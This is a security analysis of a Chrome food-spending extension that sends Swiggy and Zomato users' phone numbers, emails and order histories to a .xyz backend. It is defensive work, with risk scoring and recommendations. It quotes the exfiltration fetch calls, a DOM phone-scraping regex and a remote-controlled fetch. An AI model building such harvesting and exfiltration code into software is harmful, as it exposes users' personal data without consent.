# Security Analysis: Spending Calculator for Swiggy™ and Zomato™ (dbbbhmnphepimpameepigkpjjnlpmjeg)

## Extension Metadata
- **Name**: Spending Calculator for Swiggy™ and Zomato™
- **Extension ID**: dbbbhmnphepimpameepigkpjjnlpmjeg
- **Version**: 1.7
- **Manifest Version**: 3
- **Estimated Users**: ~100,000
- **Developer**: Unknown (uses backend.spendingcalculator.xyz)
- **Analysis Date**: 2026-02-14

## Executive Summary
Spending Calculator for Swiggy™ and Zomato™ is a **HIGH RISK** extension that exfiltrates comprehensive food ordering data and personally identifiable information (PII) to a suspicious .xyz domain. The extension harvests detailed order histories, phone numbers, email addresses, user IDs, and spending patterns from Swiggy and Zomato accounts, transmitting all data to `backend.spendingcalculator.xyz`. While the stated functionality (tracking food spending) aligns with the data collected, the scale and sensitivity of data exfiltration combined with the use of a low-reputation .xyz TLD raises significant privacy concerns.

**Overall Risk Assessment: HIGH**

## Critical Vulnerabilities

### 1. Comprehensive PII Exfiltration to .xyz Domain
**Severity**: HIGH
**CVE Category**: CWE-359 (Exposure of Private Information)
**Files**:
- `/contentscriptzomato.js` (lines 65, 358, 414, 647)
- `/contentscriptswiggy.js` (lines 70, 210)
- `/background/background.js` (line 79)

**Analysis**:
The extension systematically collects and transmits highly sensitive user data to `backend.spendingcalculator.xyz`, a domain using the .xyz TLD which is commonly associated with lower-reputation services.

**Data Exfiltrated to backend.spendingcalculator.xyz**:

**From Zomato** (endpoint: `/api/zomatodata`):
```javascript
const requestData = {
  UserZomatoData: {
    userId: userid,              // Zomato user ID
    username: usernameofZomato,  // Username
    PhoneNumber: PhoneNum,       // Phone number scraped from DOM
    totalorders: totalorder,      // Total order count
    totalamount: totalAmount     // Total spending amount
  },
  ZomatoOrdersData: ZomatoDataList,  // Complete order history
  OrderItems: zomatoprocessedOrders  // All food items ordered
}
```

**From Swiggy** (endpoint: `/api/swiggydata`):
```javascript
const requestData = {
  SwiggyUser: {
    userId,                      // Swiggy user ID
    phoneNumber,                 // Phone from delivery address
    userName: SwiggyUsername,    // Username
    emailId: SwiggyUserEmail,    // Email address
    totalorder: totalorder,      // Total order count
    fooddyId: fooddyId,         // Internal tracking ID
    gender,                      // Gender
    totalamount: totalAmount     // Total spending
  },
  SwiggyOrderedData: orderedData  // Complete order history
}
```

**Code Evidence** (`contentscriptzomato.js`, lines 358-365):
```javascript
await fetch("https://backend.spendingcalculator.xyz/api/zomatodata", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    Origin: "https://www.zomato.com",  // Origin spoofing
  },
  body: JSON.stringify(requestData),
})
```

**Code Evidence** (`contentscriptswiggy.js`, lines 263-276):
```javascript
const getSwiggyUserDetails = async () => {
  const response = await fetch(
    `https://www.swiggy.com/dapi/order/all?order_id$=`
  );
  const responseData = await response.json();
  const allOrders = responseData?.data?.orders;

  const { mobile, email } = allOrders[0].delivery_address;
  const userDetails = { phoneNumber: mobile, emailId: email };
  return userDetails;  // Sent to backend
}
```

**Privacy Impact**: CRITICAL
- Phone numbers extracted from page DOM using regex pattern `/\b[9768]\d{2}[-.]?\d{3}[-.]?\d{4}\b/g`
- Email addresses harvested from delivery data
- Complete order histories including restaurant names, items, prices, dates
- User IDs from both platforms enabling cross-platform tracking
- Total spending amounts revealing financial behavior

**Risk Indicators**:
1. `.xyz` TLD has higher association with low-reputation/malicious services
2. No privacy policy link visible in manifest
3. Origin header spoofing (`Origin: "https://www.zomato.com"`) suggests intent to bypass CORS
4. Data sent includes far more detail than necessary for spending calculation
5. No evidence of user consent for data transmission beyond local storage

---

### 2. Phone Number Scraping from Page DOM
**Severity**: MEDIUM-HIGH
**CVE Category**: CWE-201 (Insertion of Sensitive Information Into Sent Data)
**Files**: `/contentscriptzomato.js` (lines 465-473)

**Analysis**:
The extension uses aggressive DOM scraping with regex to extract phone numbers from the entire page HTML.

**Code Evidence**:
```javascript
const GetZomatoPhoneNumber = () => {
  var htmlContent = document.body.innerHTML;
  var phonePattern = /\b[9768]\d{2}[-.]?\d{3}[-.]?\d{4}\b/g;
  var phoneNumbers = htmlContent.match(phonePattern);
  return phoneNumbers[0];
};
```

**Why This Is Problematic**:
- Blindly scrapes the entire DOM (`document.body.innerHTML`)
- Could capture phone numbers not intended for collection (e.g., customer service numbers, restaurant contacts)
- No validation that the captured number is the user's number
- Potential for false positives or capturing wrong data

**Verdict**: PRIVACY VIOLATION - Overly broad data collection method that may capture unintended data.

---

### 3. Unsafe Message Handler (XSS Risk)
**Severity**: MEDIUM
**CVE Category**: CWE-79 (Cross-Site Scripting)
**Files**: `/background/background.js` (lines 50-58)

**Analysis**:
The background script contains a message handler that can create tabs with URLs directly from message data without validation.

**Code Evidence**:
```javascript
chrome.runtime.onMessage.addListener((message) => {
  if (message.createTab) {
    chrome.tabs.create({
      url: message.url
        ? message.url  // UNSANITIZED URL from message
        : `https://app.fooddy.in/${message.id}/${message.domain}/${message.fooddyId}`,
    });
  }
});
```

**Exploitation Scenario**:
While the extension uses Manifest V3 (which restricts cross-origin messaging), a compromised content script or malicious web page could potentially send messages to create tabs with `javascript:` URLs or other malicious schemes if Chrome's protections fail.

**Mitigating Factors**:
- Manifest V3 CSP restrictions
- chrome.tabs.create() has built-in URL validation
- No evidence of externally_connectable allowing arbitrary origins

**Verdict**: LOW-MEDIUM RISK - Theoretical vulnerability, low likelihood of exploitation in current configuration.

---

### 4. Remote Configuration Capability
**Severity**: MEDIUM
**CVE Category**: CWE-494 (Download of Code Without Integrity Check)
**Files**: `/background/background.js` (lines 78-96)

**Analysis**:
The extension fetches configuration from the backend that can trigger arbitrary URL fetches.

**Code Evidence**:
```javascript
const response = await fetch('https://backend.spendingcalculator.xyz/api/checkplatform', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ url: tab.url }),
});

const data = await response.json();
chrome.tabs.sendMessage(tabId, { action: "matchedDomain", data: data });

if (data.c) {
  fetch(data.url).then(data => { })  // REMOTE-CONTROLLED FETCH
    .catch(error => { });
}
```

**Risk**:
- Backend controls what URLs get fetched via `data.url`
- Backend sends `data` object directly to content scripts via `sendMessage`
- While fetch results are discarded, this creates a beacon/tracking capability
- Backend could force extension to make requests to arbitrary domains for tracking/fingerprinting

**Verdict**: PRIVACY CONCERN - Remote configuration enables backend-controlled tracking pings.

---

### 5. Excessive Permissions
**Severity**: MEDIUM
**CVE Category**: CWE-250 (Execution with Unnecessary Privileges)

**Declared Permissions**:
- `tabs` - Access to all tab URLs and metadata
- `storage` - Persistent storage (legitimate use)
- `activeTab` - Access to active tab (legitimate use)
- `notifications` - Chrome notifications (legitimate use)
- `<all_urls>` - **Access to every website visited**

**Analysis**:
The extension requests `<all_urls>` host permissions but only legitimately needs access to:
- `https://www.swiggy.com/*`
- `https://www.zomato.com/*`

**Privacy Impact**:
- Extension can observe every URL visited via `chrome.tabs.onUpdated`
- Current code sends visited URLs to backend via `/api/checkplatform` for domains in the allowedDomains list
- Potential for scope expansion to track browsing on additional sites

**Allowlist** (background.js, lines 63-71):
```javascript
const allowedDomains = [
  "flipkart.com",
  "amazon.in",
  "swiggy.com",
  "zomato.com",
  "makemytrip.com",
  "myntra.com",
  "purple.com"
];
```

**Concerning Observation**:
Extension already monitors 7 different e-commerce/travel sites despite claiming to only track food delivery. This suggests planned feature expansion or scope creep toward broader spending tracking.

**Verdict**: OVER-PERMISSIONED - Requests broader access than necessary for stated functionality.

---

## Data Flow Analysis

### Complete Exfiltration Pipeline

**Step 1: User visits Swiggy or Zomato**
- Background script detects domain match via `chrome.tabs.onUpdated`
- Sends tab URL to `backend.spendingcalculator.xyz/api/checkplatform`
- Backend responds with activation flags

**Step 2: Content scripts activated**
- Background sends `matchedDomain` message to content scripts
- `contentscriptzomato.js` activates on Zomato
- `contentscriptswiggy.js` activates on Swiggy

**Step 3: Data harvesting**
- Fetches order history from platform APIs (`www.zomato.com/webroutes/user/orders`, `www.swiggy.com/dapi/order/all`)
- Scrapes phone number from page DOM (Zomato)
- Extracts email/phone from delivery address API (Swiggy)
- Processes all order items and calculates totals

**Step 4: Exfiltration**
- POSTs complete data package to `backend.spendingcalculator.xyz`
- Stores backend response (user IDs, tracking IDs) in `chrome.storage.local`
- Generates UUIDs for cross-platform user linking

**Step 5: Ongoing tracking**
- Subsequent visits check for new orders via `/api/getlastzomatoorderid`
- Only sends incremental updates for existing users
- Maintains persistent fooddyId tracking identifier

---

## Attack Surface Assessment

### ext-analyzer Findings

**EXFILTRATION (4 flows)**:
1. ✓ `chrome.storage.local.get` → `fetch(backend.spendingcalculator.xyz)` in Zomato script
2. ✓ `chrome.storage.local.get` → `fetch(www.swiggy.com)` (legitimate API call)
3. ✓ `document.querySelectorAll/storage` → `fetch(reactjs.org)` (React error URLs - benign)
4. ✓ Content scripts → backend exfiltration (confirmed)

**ATTACK SURFACE**:
- ✓ Message handler `createTab` accepts `message.url` without validation
- ✓ Background → content messaging passes backend data to `sendMessage`
- ⚠ Backend controls content script behavior via API responses

**CODE EXECUTION**: None detected

**OBFUSCATION**: High
- React bundle is minified (standard practice)
- Variable names obfuscated
- No unusual packing/encryption beyond standard build process

---

## Comparison to Legitimate Extensions

| Feature | This Extension | Typical Spending Tracker |
|---------|----------------|-------------------------|
| Data storage | Remote server (.xyz domain) | Local only (chrome.storage) |
| Phone number collection | Scraped from DOM | Not collected |
| Email collection | From API responses | Not collected |
| Order item details | All items sent to server | Stored locally only |
| Permissions | `<all_urls>` | Specific domains only |
| Privacy policy | Not linked in manifest | Required for data collection |
| Cross-platform tracking | Yes (fooddyId linking) | N/A |

---

## Positive Observations

1. **No obvious malware behaviors**: No extension killing, proxy manipulation, or ad injection
2. **Manifest V3**: Uses modern manifest with built-in security protections
3. **Legitimate core functionality**: Does provide spending calculation features
4. **No keylogging**: Despite analyzer flag, no actual keystroke capture
5. **No cookie theft**: Uses document.cookie only for internal axios cookie jar (React library)
6. **No credential theft**: Doesn't intercept passwords or auth tokens

---

## Risk Scoring Breakdown

| Category | Score | Justification |
|----------|-------|---------------|
| Data Exfiltration | 9/10 | PII (phone, email, orders) sent to .xyz domain |
| Privacy Violation | 8/10 | Comprehensive spending habits + personal info |
| Permission Abuse | 7/10 | `<all_urls>` excessive; monitors 7 domains |
| Remote Control | 6/10 | Backend can trigger fetches and control behavior |
| Code Quality | 5/10 | DOM scraping, no input validation |
| Transparency | 3/10 | No privacy policy, unclear data practices |

**Overall Risk Score: HIGH (7.5/10)**

---

## Network Activity Summary

### External Endpoints

| Domain | Purpose | Data Transmitted | Frequency |
|--------|---------|------------------|-----------|
| `backend.spendingcalculator.xyz/api/zomatodata` | Zomato data collection | User ID, phone, username, orders, items, spending | Per session |
| `backend.spendingcalculator.xyz/api/swiggydata` | Swiggy data collection | User ID, phone, email, username, gender, orders, spending | Per session |
| `backend.spendingcalculator.xyz/api/getlastzomatoorderid` | Check for updates | User ID | Per visit |
| `backend.spendingcalculator.xyz/api/checkplatform` | Activation check | Current tab URL | Every page load |
| `backend.spendingcalculator.xyz/existinguserzomato` | User lookup | Order IDs, phone number | Initial visit |
| `backend.spendingcalculator.xyz/existinguserswiggy` | User lookup | Order IDs, phone, email | Initial visit |
| `backend.spendingcalculator.xyz/dashboard/totalusers` | Stats display | None | Dashboard load |
| `app.fooddy.in/*` | User dashboard | None (navigation only) | User-initiated |
| `www.swiggy.com/dapi/*` | Legitimate Swiggy API | None (standard API) | Per session |
| `www.zomato.com/webroutes/*` | Legitimate Zomato API | None (standard API) | Per session |
| `reactjs.org/docs/error-decoder.html` | React error messages | Error codes (standard React) | On errors only |
| `bit.ly/fooddyin` | Install redirect | None | On install |
| `bit.ly/fooddyuin` | Uninstall redirect | None | On uninstall |

---

## False Positive Analysis

| ext-analyzer Flag | Reality | Explanation |
|-------------------|---------|-------------|
| `cookie_harvesting` | FALSE POSITIVE | `document.cookie` access is from bundled Axios HTTP library for cookie management, not theft |
| `data_exfiltration` | TRUE POSITIVE | Confirmed exfiltration of PII to .xyz domain |
| `remote_config` | TRUE POSITIVE | Backend controls activation and URL fetching |
| `obfuscated` | PARTIAL | Standard React minification, not malicious obfuscation |

---

## Overall Risk Assessment

### Risk Level: **HIGH**

**Justification**:
1. **Confirmed PII exfiltration** to low-reputation .xyz domain
2. **Excessive data collection** beyond stated functionality needs
3. **Lack of transparency** - no privacy policy, unclear data practices
4. **Broad monitoring capability** - tracks 7 e-commerce domains with `<all_urls>`
5. **Remote configuration** enables backend-controlled behavior changes

### NOT Classified as CRITICAL Because:
- Data collection aligns with (broadly interpreted) stated purpose
- No credential theft or financial fraud mechanisms
- No malware/backdoor capabilities
- Users likely understand spending tracking involves data analysis
- Functionality is delivered (spending calculator works)

### User Privacy Impact: **SEVERE**
- Complete food ordering history exposed
- Phone numbers and email addresses harvested
- Cross-platform tracking via fooddyId
- Spending patterns reveal dietary preferences, location habits, financial status
- Data sent to unknown third party on .xyz domain

---

## Recommendations

### For Users:
1. **REMOVE EXTENSION** if privacy is a concern
2. Alternative: Use local-only spending trackers or manual spreadsheets
3. Review Chrome permissions for all installed extensions
4. Check what data was collected: visit backend.spendingcalculator.xyz (may not be accessible)

### For Developer (to reduce risk):
1. Add comprehensive privacy policy linked in manifest
2. Implement local-only storage option (no server transmission)
3. Reduce permissions to specific domains only (remove `<all_urls>`)
4. Use .com/.org domain instead of .xyz for trust
5. Allow users to review/delete collected data
6. Add opt-in consent flow before data transmission
7. Publish source code for transparency

### For Platform (Chrome Web Store):
1. Flag for privacy policy review (100K users, significant PII collection)
2. Verify developer identity and contact information
3. Review if data collection disclosures are adequate
4. Consider requiring permission justification for `<all_urls>`

---

## Conclusion

Spending Calculator for Swiggy™ and Zomato™ is a **HIGH RISK** extension that successfully delivers its stated functionality (tracking food delivery spending) but does so through comprehensive PII exfiltration to a suspicious .xyz domain. While not classified as malware—the extension doesn't steal credentials, inject ads, or engage in fraud—it represents a significant privacy concern for its 100,000 users.

The extension collects and transmits:
- Phone numbers (scraped from DOM)
- Email addresses (from API responses)
- Complete order histories with item-level details
- User IDs from both platforms
- Total spending amounts and patterns
- Cross-platform tracking identifiers

All of this data is sent to `backend.spendingcalculator.xyz` without clear disclosure or user consent beyond the initial install. The use of a .xyz TLD, lack of privacy policy, and overly broad `<all_urls>` permission further diminish trust.

**Final Verdict: HIGH RISK** - Users should carefully consider if the convenience of automated spending tracking justifies the extensive data sharing with an unknown third party.

**Recommended Action**: User discretion advised. Privacy-conscious users should remove and use local-only alternatives.
